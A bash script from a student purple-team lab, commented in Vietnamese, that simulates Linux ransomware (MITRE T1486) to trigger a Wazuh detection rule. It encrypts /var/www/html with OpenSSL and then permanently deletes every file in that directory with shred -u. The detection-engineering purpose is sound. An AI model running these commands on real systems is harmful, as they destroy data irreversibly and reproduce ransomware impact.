#!/bin/bash
# =============================================================================
# Kịch bản kiểm thử T1486 - Impact: Data Encrypted for Impact (Ransomware Linux)
# Đồ án: Purple Team Detection Engineering Lab
# Sinh viên: Nguyễn Minh Trí (MSSV: 92510340016)
# Kỹ thuật: MITRE ATT&CK T1486
# Quy tắc Wazuh đích: Rule 100013 (Level 14 - Critical/Emergency)
# =============================================================================

echo "[*] =========================================================="
echo "[*] THỰC THI MÔ PHỎNG T1486 - MÃ HÓA & HỦY DỮ LIỆU BẰNG SHRED"
echo "[*] =========================================================="

echo "[+] Tạo dữ liệu mẫu tại /var/www/html/secret.txt..."
mkdir -p /var/www/html
echo "CONFIDENTIAL WEB SOURCE CODE AND DATABASE PURPLE TEAM" > /var/www/html/secret.txt

echo "[+] Thực hiện nén và mã hóa bằng OpenSSL AES-256-CBC..."
tar -czf - /var/www/html | openssl enc -aes-256-cbc -salt -pass pass:12345 -out /var/www/html.enc

echo "[+] Thực hiện hủy tệp tin gốc vĩnh viễn bằng lệnh shred -u..."
find /var/www/html -type f -exec shred -u {} \;

echo ""
echo "[✓] Đã kích hoạt mã hóa và hủy tệp! Vui lòng kiểm tra cảnh báo Level 14 (Rule 100013) trên Wazuh Dashboard."
